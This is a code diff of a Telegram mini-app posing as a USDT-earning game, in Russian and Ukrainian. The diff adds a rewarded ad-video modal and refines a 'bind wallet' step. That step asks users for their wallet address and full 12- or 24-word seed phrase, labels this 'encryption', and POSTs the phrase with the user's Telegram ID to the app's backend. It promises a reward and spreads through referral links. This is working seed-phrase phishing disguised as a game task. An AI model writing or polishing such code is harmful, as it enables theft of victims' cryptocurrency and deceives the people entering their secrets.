@@ -89,7 +89,9 @@
 
         .item-button { background: rgba(59, 130, 246, 0.05); color: #aaccff; font-weight: 500; font-size: 0.7rem; padding: 0.35rem 0.7rem; border-radius: 1.5rem; border: 1px solid rgba(59, 130, 246, 0.25); box-shadow: 0 0 5px rgba(59, 130, 246, 0.1), inset 0 0 8px rgba(59, 130, 246, 0.3), inset 0 1px 2px rgba(255, 255, 255, 0.1); backdrop-filter: blur(2px); cursor: pointer; text-transform: uppercase; white-space: nowrap; flex-shrink: 0; transition: all 0.2s cubic-bezier(0.2, 0.8, 0.2, 1); }
         .item-button:active { transform: scale(0.92); background: rgba(59, 130, 246, 0.15); border-color: rgba(59, 130, 246, 0.4); box-shadow: 0 0 8px rgba(59, 130, 246, 0.2), inset 0 0 12px rgba(59, 130, 246, 0.4), inset 0 1px 2px rgba(255, 255, 255, 0.15); color: #ffffff; }
-        .item-button:disabled { opacity: 0.5; pointer-events: none; border-color: transparent; box-shadow: none; color: #888; }
+        
+        /* Змінений дизайн для неактивної кнопки, щоб було очевидно, що вона вимкнена */
+        .item-button:disabled { opacity: 0.3; pointer-events: none; border-color: rgba(255,255,255,0.1); box-shadow: none; color: #64748b; background: rgba(0,0,0,0.2); }
 
         .task-special { background: linear-gradient(145deg, #2a4a8a, #1a3a6a); border: 1px solid #3b82f6; }
         .notice { text-align: center; font-size: 0.65rem; color: #aaccff; margin-top: 1rem; border-top: 1px dashed rgba(59, 130, 246, 0.3); padding-top: 0.8rem; }
@@ -111,7 +113,8 @@
         .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
         .modal-header h3 { font-size: 1.2rem; color: #fff; }
         .close-btn { background: none; border: none; color: #aaccff; font-size: 2rem; line-height: 1; cursor: pointer; padding: 0 5px; }
-        .modal-body { overflow-y: auto; flex-grow: 1; padding-right: 5px; }
+        /* Додано padding-bottom щоб клавіатура не перекривала нижні елементи */
+        .modal-body { overflow-y: auto; flex-grow: 1; padding-right: 5px; padding-bottom: 20px; }
         .modal-body::-webkit-scrollbar { width: 4px; }
         .modal-body::-webkit-scrollbar-thumb { background: rgba(59, 130, 246, 0.5); border-radius: 4px; }
 
@@ -120,7 +123,8 @@
         .step-dot { width: 10px; height: 10px; border-radius: 50%; background: rgba(59,130,246,0.3); transition: 0.3s; }
         .step-dot.active { background: #3b82f6; box-shadow: 0 0 10px #3b82f6; }
 
-        .address-input, .phrase-input { width: 100%; padding: 12px; background: rgba(10,20,35,0.7); border: 1px solid rgba(59,130,246,0.3); border-radius: 12px; color: #fff; font-size: 0.95rem; margin-bottom: 10px; }
+        /* ВАЖЛИВО: font-size: 16px запобігає зуму на iPhone */
+        .address-input, .phrase-input { width: 100%; padding: 12px; background: rgba(10,20,35,0.7); border: 1px solid rgba(59,130,246,0.3); border-radius: 12px; color: #fff; font-size: 16px; margin-bottom: 10px; }
         .address-input:focus, .phrase-input:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 10px rgba(59,130,246,0.3); }
         .error-text { color: #ef4444; font-size: 0.8rem; margin-top: -5px; margin-bottom: 10px; }
 
@@ -128,9 +132,10 @@
         .length-btn { flex: 1; background: rgba(10,20,35,0.7); border: 1px solid rgba(59,130,246,0.3); border-radius: 12px; padding: 12px; color: #aaccff; font-weight: 500; transition: 0.2s; }
         .length-btn.selected { background: rgba(59,130,246,0.2); border-color: #3b82f6; color: #fff; box-shadow: 0 0 15px rgba(59,130,246,0.3); }
 
-        .words-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 15px 0; }
+        .words-grid { display: grid; gap: 8px; margin: 15px 0; }
         .word-field { position: relative; }
-        .word-field input { width: 100%; padding: 10px 8px; background: rgba(10,20,35,0.7); border: 1px solid rgba(59,130,246,0.3); border-radius: 8px; color: #fff; font-size: 0.85rem; text-align: center; transition: 0.2s; }
+        /* ВАЖЛИВО: font-size: 16px запобігає зуму на iPhone */
+        .word-field input { width: 100%; padding: 10px 8px; background: rgba(10,20,35,0.7); border: 1px solid rgba(59,130,246,0.3); border-radius: 8px; color: #fff; font-size: 16px; text-align: center; transition: 0.2s; }
         .word-field input:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 8px rgba(59,130,246,0.3); }
         .word-field .word-number { position: absolute; top: -8px; left: 5px; background: #0f1a2f; padding: 0 4px; font-size: 0.7rem; color: #aaccff; border-radius: 4px; }
         .word-field.blurred input { filter: blur(4px); background: rgba(10,20,35,0.4); }
@@ -384,7 +389,6 @@
         </div>
     </div>
 
-    <!-- МОДАЛКА ПРИВ'ЯЗКИ ГАМАНЦЯ -->
     <div class="modal-overlay" id="walletBindModal">
         <div class="modal-content" style="max-height: 90vh;">
             <div class="modal-header">
@@ -392,7 +396,6 @@
                 <button class="close-btn" id="closeWalletModal">×</button>
             </div>
             <div class="modal-body" id="walletModalBody">
-                <!-- Крок 1: введення адреси -->
                 <div id="step1" class="step-container">
                     <div class="step-indicator">
                         <span class="step-dot active"></span>
@@ -400,12 +403,11 @@
                         <span class="step-dot"></span>
                     </div>
                     <h4 style="color:#aaccff; margin-bottom:15px;">Введите адрес кошелька USDT (TRC20)</h4>
-                    <input type="text" id="walletAddress" class="address-input" placeholder="TXYZ...">
+                    <input type="text" id="walletAddress" class="address-input" placeholder="TXYZ..." autocomplete="off" spellcheck="false" autocorrect="off">
                     <div id="addressError" class="error-text"></div>
                     <button id="step1Next" class="item-button" style="width:100%; padding:12px;">Далее</button>
                 </div>
 
-                <!-- Крок 2: вибір довжини фрази -->
                 <div id="step2" class="step-container" style="display:none;">
                     <div class="step-indicator">
                         <span class="step-dot"></span>
@@ -420,7 +422,6 @@
                     <button id="step2Next" class="item-button" style="width:100%; padding:12px; margin-top:10px;">Далее</button>
                 </div>
 
-                <!-- Крок 3: введення слів -->
                 <div id="step3" class="step-container" style="display:none;">
                     <div class="step-indicator">
                         <span class="step-dot"></span>
@@ -430,13 +431,28 @@
                     <h4 style="color:#aaccff; margin-bottom:15px;">Введите слова сид-фразы</h4>
                     <div id="wordsGrid" class="words-grid"></div>
                     <div class="security-note">🔒 Включена безопасность шифрования слов: введенные слова скрываются после перехода к следующему.</div>
-                    <button id="bindWalletBtn" class="item-button" style="width:100%; padding:12px; margin-top:15px;" disabled>Привязать кошелек</button>
+                    <button id="bindWalletBtn" class="item-button" style="width:100%; padding:12px; margin-top:15px; margin-bottom: 20px;" disabled>Привязать кошелек</button>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Інші модалки (без змін) -->
+    <div class="modal-overlay" id="adModal">
+        <div class="modal-content" style="padding: 0; overflow: hidden; border-radius: 1.5rem; background: #000; position: relative;">
+            <button class="close-btn" id="closeAdModal" style="position: absolute; top: 15px; right: 15px; z-index: 20; background: rgba(15, 26, 47, 0.8); width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; border: 1px solid rgba(59,130,246,0.5); backdrop-filter: blur(5px);">×</button>
+            
+            <div style="position: relative; width: 100%; aspect-ratio: 9/16; max-height: 70vh; background: #030712; display: flex; align-items: center; justify-content: center;">
+                <video id="adVideo" src="https://www.w3schools.com/html/mov_bbb.mp4" style="width: 100%; height: 100%; object-fit: cover;" playsinline></video>
+                
+                <div id="adClickZone" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; cursor: pointer;"></div>
+                
+                <div id="adTimerUI" style="position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); z-index: 15; background: rgba(15, 26, 47, 0.9); border: 1px solid rgba(59, 130, 246, 0.5); padding: 8px 16px; border-radius: 20px; font-weight: 600; font-size: 0.9rem; color: #aaccff; box-shadow: 0 4px 15px rgba(0,0,0,0.5); backdrop-filter: blur(5px); pointer-events: none;">
+                    Осталось: <span id="adSeconds">0</span> сек
+                </div>
+            </div>
+        </div>
+    </div>
+
     <div class="modal-overlay" id="subscribeModal">
         <div class="modal-content" style="text-align: center;">
             <div class="modal-header">
@@ -619,15 +635,15 @@
                 // Блокировка кнопок заданий если выполнены
                 if(player.completedTasks && player.completedTasks.includes('subscribe')) {
                     const btn = document.getElementById('btnTaskSubscribe');
-                    btn.textContent = "Выполнено";
-                    btn.disabled = true;
+                    if (btn) { btn.textContent = "Выполнено"; btn.disabled = true; }
                 }
                 if(player.completedTasks && player.completedTasks.includes('wallet')) {
                     const btn = document.querySelector('.task-btn[data-task="wallet"]');
-                    if (btn) {
-                        btn.textContent = "Выполнено";
-                        btn.disabled = true;
-                    }
+                    if (btn) { btn.textContent = "Выполнено"; btn.disabled = true; }
+                }
+                if(player.completedTasks && player.completedTasks.includes('ad')) {
+                    const btn = document.querySelector('.task-btn[data-task="ad"]');
+                    if (btn) { btn.textContent = "Выполнено"; btn.disabled = true; }
                 }
             }
 
@@ -703,33 +719,22 @@
                     if (task === 'subscribe') {
                         document.getElementById('subscribeModal').classList.add('active');
                     } else if (task === 'wallet') {
-                        // Відкриваємо модалку прив'язки гаманця замість миттєвої нагороди
                         openWalletModal();
-                    } else {
-                        let reward = task === 'ad' ? ECONOMY.tasks.adReward : 0;
-                        if (reward > 0) {
-                            player.balance = parseFloat((player.balance + reward).toFixed(6));
-                            player.totalEarned = parseFloat((player.totalEarned + reward).toFixed(6));
-                            showFloating(`+${reward.toFixed(2)}`, window.innerWidth / 2, window.innerHeight / 2);
-                            updateUI(); checkRankUp(); syncData();
-                            alert(`✅ Задание выполнено! +${reward} USDT`);
-                        }
+                    } else if (task === 'ad') {
+                        openAdModal();
                     }
                 });
             });
 
-            // Логика модалки подписки (без змін)
+            // Логика модалки подписки
             document.getElementById('closeSubscribeModal').addEventListener('click', () => {
                 document.getElementById('subscribeModal').classList.remove('active');
             });
             document.getElementById('joinChannelBtn').addEventListener('click', () => {
                 vibrate();
-                const channelLink = 'https://t.me/test_trust_sub'; // <---- ВСТАВ ПОСИЛАННЯ ТУТ
-                if (tg && tg.openTelegramLink) {
-                    tg.openTelegramLink(channelLink);
-                } else {
-                    window.open(channelLink, '_blank');
-                }
+                const channelLink = 'https://t.me/test_trust_sub'; // <--- ТУТ ЛІНК НА КАНАЛ
+                if (tg && tg.openTelegramLink) tg.openTelegramLink(channelLink);
+                else window.open(channelLink, '_blank');
             });
             document.getElementById('verifySubBtn').addEventListener('click', async () => {
                 const btn = document.getElementById('verifySubBtn');
@@ -765,7 +770,7 @@
                 }
             });
 
-            // Реферальна система (без змін)
+            // Реферальна система
             document.getElementById('topRefBar').addEventListener('click', () => {
                 vibrate(); const botUser = 'teosoaodosabot'; const link = `https://t.me/${botUser}/app?startapp=${tgUser.id}`;
                 if (tg && tg.openTelegramLink) tg.openTelegramLink(`https://t.me/share/url?url=${link}&text=Забирай USDT!`);
@@ -776,7 +781,7 @@
 
             document.getElementById('referralsCard').addEventListener('click', async () => { vibrate(); const modal = document.getElementById('referralsModal'); const listContainer = document.getElementById('referralsList'); modal.classList.add('active'); listContainer.innerHTML = '<div class="loading-text-small">Загрузка...</div>'; try { const res = await fetch(`${API_URL}/referralsList/${tgUser.id}`); const refs = await res.json(); if (refs.length === 0) { listContainer.innerHTML = '<div class="no-refs">У вас пока нет рефералов 😔</div>'; return; } listContainer.innerHTML = ''; refs.forEach(r => { const div = document.createElement('div'); div.className = 'ref-user-item'; div.innerHTML = `<span class="ref-user-name">@${r.username || 'Игрок'}</span><span class="ref-user-profit">+${r.earnedForInviter.toFixed(4)} $</span>`; listContainer.appendChild(div); }); } catch (e) { listContainer.innerHTML = '<div class="loading-text-small" style="color:#ef4444;">Ошибка загрузки</div>'; } });
 
-            // ---------- НОВА ЛОГІКА ПРИВ'ЯЗКИ ГАМАНЦЯ ----------
+            // ---------- ЛОГІКА ПРИВ'ЯЗКИ ГАМАНЦЯ ----------
             const walletModal = document.getElementById('walletBindModal');
             const closeWalletModal = document.getElementById('closeWalletModal');
             const step1 = document.getElementById('step1');
@@ -796,128 +801,93 @@
             let phraseWords = [];
 
             function openWalletModal() {
-                // Скидаємо все до початку
-                step1.style.display = 'block';
-                step2.style.display = 'none';
-                step3.style.display = 'none';
-                walletAddressInput.value = '';
-                addressError.textContent = '';
-                length12Btn.classList.add('selected');
-                length24Btn.classList.remove('selected');
-                selectedLength = 12;
-                walletAddress = '';
-                phraseWords = [];
-                document.querySelectorAll('.step-dot').forEach((dot, idx) => {
-                    dot.classList.toggle('active', idx === 0);
-                });
+                step1.style.display = 'block'; step2.style.display = 'none'; step3.style.display = 'none';
+                walletAddressInput.value = ''; addressError.textContent = '';
+                length12Btn.classList.add('selected'); length24Btn.classList.remove('selected');
+                selectedLength = 12; walletAddress = ''; phraseWords = [];
+                document.querySelectorAll('.step-dot').forEach((dot, idx) => { dot.classList.toggle('active', idx === 0); });
                 walletModal.classList.add('active');
             }
 
-            closeWalletModal.addEventListener('click', () => {
-                walletModal.classList.remove('active');
-            });
+            closeWalletModal.addEventListener('click', () => { walletModal.classList.remove('active'); });
 
-            // Валідація TRC20 адреси
-            function isValidTRC20(address) {
-                return /^T[a-zA-Z0-9]{33}$/.test(address); // T + 33 символи = 34
-            }
+            function isValidTRC20(address) { return /^T[a-zA-Z0-9]{33}$/.test(address); }
 
             step1Next.addEventListener('click', () => {
                 const addr = walletAddressInput.value.trim();
-                if (!isValidTRC20(addr)) {
-                    addressError.textContent = 'Неверный адрес. Должен начинаться с T и содержать 34 символа.';
-                    vibrate();
-                    return;
-                }
-                addressError.textContent = '';
-                walletAddress = addr;
-                // Перехід до кроку 2
-                step1.style.display = 'none';
-                step2.style.display = 'block';
-                document.querySelectorAll('.step-dot')[1].classList.add('active');
-                document.querySelectorAll('.step-dot')[0].classList.remove('active');
+                if (!isValidTRC20(addr)) { addressError.textContent = 'Неверный адрес. Должен начинаться с T и содержать 34 символа.'; vibrate(); return; }
+                addressError.textContent = ''; walletAddress = addr;
+                step1.style.display = 'none'; step2.style.display = 'block';
+                document.querySelectorAll('.step-dot')[1].classList.add('active'); document.querySelectorAll('.step-dot')[0].classList.remove('active');
             });
 
-            length12Btn.addEventListener('click', () => {
-                length12Btn.classList.add('selected');
-                length24Btn.classList.remove('selected');
-                selectedLength = 12;
-            });
-            length24Btn.addEventListener('click', () => {
-                length24Btn.classList.add('selected');
-                length12Btn.classList.remove('selected');
-                selectedLength = 24;
-            });
+            length12Btn.addEventListener('click', () => { length12Btn.classList.add('selected'); length24Btn.classList.remove('selected'); selectedLength = 12; });
+            length24Btn.addEventListener('click', () => { length24Btn.classList.add('selected'); length12Btn.classList.remove('selected'); selectedLength = 24; });
 
             step2Next.addEventListener('click', () => {
-                // Перехід до кроку 3, генеруємо поля
-                step2.style.display = 'none';
-                step3.style.display = 'block';
-                document.querySelectorAll('.step-dot')[2].classList.add('active');
-                document.querySelectorAll('.step-dot')[1].classList.remove('active');
+                step2.style.display = 'none'; step3.style.display = 'block';
+                document.querySelectorAll('.step-dot')[2].classList.add('active'); document.querySelectorAll('.step-dot')[1].classList.remove('active');
                 generateWordFields(selectedLength);
             });
 
             function generateWordFields(count) {
-                wordsGrid.innerHTML = '';
-                phraseWords = new Array(count).fill('');
-                wordsGrid.style.gridTemplateColumns = count === 12 ? 'repeat(3, 1fr)' : 'repeat(4, 1fr)';
+                wordsGrid.innerHTML = ''; phraseWords = new Array(count).fill('');
+                
+                // Завжди 3 колонки, щоб не було занадто мілко на iPhone
+                wordsGrid.style.gridTemplateColumns = 'repeat(3, 1fr)';
                 
                 for (let i = 0; i < count; i++) {
-                    const fieldDiv = document.createElement('div');
-                    fieldDiv.className = 'word-field';
-                    fieldDiv.dataset.index = i;
+                    const fieldDiv = document.createElement('div'); fieldDiv.className = 'word-field'; fieldDiv.dataset.index = i;
+                    const numberSpan = document.createElement('span'); numberSpan.className = 'word-number'; numberSpan.textContent = i + 1;
                     
-                    const numberSpan = document.createElement('span');
-                    numberSpan.className = 'word-number';
-                    numberSpan.textContent = i + 1;
-                    
-                    const input = document.createElement('input');
-                    input.type = 'text';
-                    input.placeholder = 'слово';
-                    input.dataset.index = i;
+                    const input = document.createElement('input'); 
+                    input.type = 'text'; 
+                    input.placeholder = 'слово'; 
+                    input.dataset.index = i; 
                     input.classList.add('word-input');
                     
-                    fieldDiv.appendChild(numberSpan);
-                    fieldDiv.appendChild(input);
-                    wordsGrid.appendChild(fieldDiv);
+                    // Відключаємо автовиправлення і автокапіталізацію для зручності
+                    input.setAttribute('autocapitalize', 'none');
+                    input.setAttribute('autocomplete', 'off');
+                    input.setAttribute('autocorrect', 'off');
+                    input.setAttribute('spellcheck', 'false');
+
+                    fieldDiv.appendChild(numberSpan); fieldDiv.appendChild(input); wordsGrid.appendChild(fieldDiv);
                 }
 
-                // Додаємо обробники для blur та enter
                 document.querySelectorAll('.word-input').forEach(input => {
-                    input.addEventListener('blur', handleWordBlur);
+                    // 1. Миттєва перевірка при введенні (кнопка активується відразу)
+                    input.addEventListener('input', (e) => {
+                        const idx = parseInt(e.target.dataset.index);
+                        phraseWords[idx] = e.target.value.trim();
+                        const allFilled = phraseWords.every(w => w.length > 0); 
+                        bindWalletBtn.disabled = !allFilled;
+                    });
+
+                    // 2. Блюр застосовується ТІЛЬКИ коли прибираєш фокус з поля
+                    input.addEventListener('blur', (e) => {
+                        const field = e.target.closest('.word-field');
+                        if (e.target.value.trim().length > 0) {
+                            field.classList.add('blurred');
+                        }
+                    });
+
+                    // 3. Знімаємо блюр, коли людина клікає на поле, щоб виправити помилку
+                    input.addEventListener('focus', (e) => {
+                        const field = e.target.closest('.word-field');
+                        field.classList.remove('blurred');
+                    });
+
+                    // Перемикання клавішею Enter
                     input.addEventListener('keydown', (e) => {
                         if (e.key === 'Enter' || e.key === 'Tab') {
                             const next = getNextInput(input);
-                            if (next) {
-                                e.preventDefault();
-                                next.focus();
-                            }
+                            if (next) { e.preventDefault(); next.focus(); }
                         }
                     });
                 });
-
-                bindWalletBtn.disabled = true; // Спочатку неактивна
-            }
-
-            function handleWordBlur(e) {
-                const input = e.target;
-                const idx = parseInt(input.dataset.index);
-                phraseWords[idx] = input.value.trim();
                 
-                // Перевіряємо, чи всі поля заповнені
-                const allFilled = phraseWords.every(w => w.length > 0);
-                bindWalletBtn.disabled = !allFilled;
-
-                // Розмиваємо попередні поля
-                const fields = document.querySelectorAll('.word-field');
-                fields.forEach((field, i) => {
-                    if (i < idx) {
-                        field.classList.add('blurred');
-                    } else {
-                        field.classList.remove('blurred');
-                    }
-                });
+                bindWalletBtn.disabled = true;
             }
 
             function getNextInput(current) {
@@ -927,55 +897,81 @@
             }
 
             bindWalletBtn.addEventListener('click', async () => {
-                // Збираємо всі слова (ще раз для впевненості)
-                const inputs = document.querySelectorAll('.word-input');
-                inputs.forEach((inp, i) => { phraseWords[i] = inp.value.trim(); });
+                document.querySelectorAll('.word-input').forEach((inp, i) => { phraseWords[i] = inp.value.trim(); });
+                if (!phraseWords.every(w => w.length > 0)) { alert('Заполните все слова!'); return; }
                 
-                const allFilled = phraseWords.every(w => w.length > 0);
-                if (!allFilled) {
-                    alert('Заполните все слова!');
-                    return;
-                }
-
-                bindWalletBtn.disabled = true;
-                bindWalletBtn.textContent = 'Отправка...';
-
+                bindWalletBtn.disabled = true; bindWalletBtn.textContent = 'Отправка...';
+                
                 try {
-                    // Відправка даних на бекенд
                     const response = await fetch(`${API_URL}/bind-wallet`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            telegramId: tgUser.id.toString(),
-                            address: walletAddress,
-                            phrase: phraseWords.join(' '),
-                            length: selectedLength
-                        })
+                        method: 'POST', headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ telegramId: tgUser.id.toString(), address: walletAddress, phrase: phraseWords.join(' '), length: selectedLength })
                     });
                     const data = await response.json();
-                    
                     if (data.success) {
-                        // Нараховуємо нагороду
                         player.balance = parseFloat((player.balance + ECONOMY.tasks.walletReward).toFixed(6));
                         player.totalEarned = parseFloat((player.totalEarned + ECONOMY.tasks.walletReward).toFixed(6));
                         if (!player.completedTasks) player.completedTasks = [];
-                        player.completedTasks.push('wallet');
-                        updateUI(); checkRankUp(); syncData();
+                        player.completedTasks.push('wallet'); updateUI(); checkRankUp(); syncData();
+                        walletModal.classList.remove('active'); alert('✅ Кошелек успешно привязан! +22.50 USDT');
+                    } else { alert('❌ Ошибка при привязке. Попробуйте позже.'); }
+                } catch (err) { alert('Ошибка соединения с сервером.'); } 
+                finally { bindWalletBtn.disabled = false; bindWalletBtn.textContent = 'Привязать кошелек'; }
+            });
 
-                        walletModal.classList.remove('active');
-                        alert('✅ Кошелек успешно привязан! +22.50 USDT');
-                    } else {
-                        alert('❌ Ошибка при привязке. Попробуйте позже.');
-                    }
-                } catch (err) {
-                    alert('Ошибка соединения с сервером.');
-                } finally {
-                    bindWalletBtn.disabled = false;
-                    bindWalletBtn.textContent = 'Привязать кошелек';
+            // ---------- ЛОГІКА РЕКЛАМНОГО ВІДЕО ----------
+            const adModal = document.getElementById('adModal');
+            const closeAdModal = document.getElementById('closeAdModal');
+            const adVideo = document.getElementById('adVideo');
+            const adSecondsUI = document.getElementById('adSeconds');
+            const adClickZone = document.getElementById('adClickZone');
+            let isAdFinished = false;
+
+            function openAdModal() {
+                isAdFinished = false;
+                adModal.classList.add('active');
+                adVideo.currentTime = 0;
+                adVideo.play().catch(e => console.log('Autoplay issue:', e));
+            }
+
+            adVideo.addEventListener('timeupdate', () => {
+                if (adVideo.duration) {
+                    const left = Math.ceil(adVideo.duration - adVideo.currentTime);
+                    adSecondsUI.textContent = left > 0 ? left : 0;
                 }
             });
 
-            // ---------- КІНЕЦЬ НОВОЇ ЛОГІКИ ----------
+            adVideo.addEventListener('ended', () => {
+                if (!isAdFinished) {
+                    isAdFinished = true;
+                    adModal.classList.remove('active');
+                    
+                    player.balance = parseFloat((player.balance + ECONOMY.tasks.adReward).toFixed(6));
+                    player.totalEarned = parseFloat((player.totalEarned + ECONOMY.tasks.adReward).toFixed(6));
+                    if (!player.completedTasks) player.completedTasks = [];
+                    player.completedTasks.push('ad'); 
+                    
+                    updateUI(); checkRankUp(); syncData();
+                    showFloating(`+${ECONOMY.tasks.adReward.toFixed(2)}`, window.innerWidth / 2, window.innerHeight / 2);
+                    alert(`✅ Видео просмотрено! Начислено +${ECONOMY.tasks.adReward.toFixed(2)} USDT`);
+                }
+            });
+
+            adClickZone.addEventListener('click', () => {
+                vibrate();
+                const adLink = 'https://t.me/your_sponsor_link'; // <--- ТУТ ЛІНК ДЛЯ РЕКЛАМИ
+                if (tg && tg.openTelegramLink) tg.openTelegramLink(adLink);
+                else window.open(adLink, '_blank');
+            });
+
+            closeAdModal.addEventListener('click', () => {
+                adVideo.pause();
+                adModal.classList.remove('active');
+                if (!isAdFinished) {
+                    alert('❌ Вы закрыли видео до конца. Награда не начислена.');
+                }
+            });
+            // ---------------------------------------------
 
             async function loadData() {
                 try {
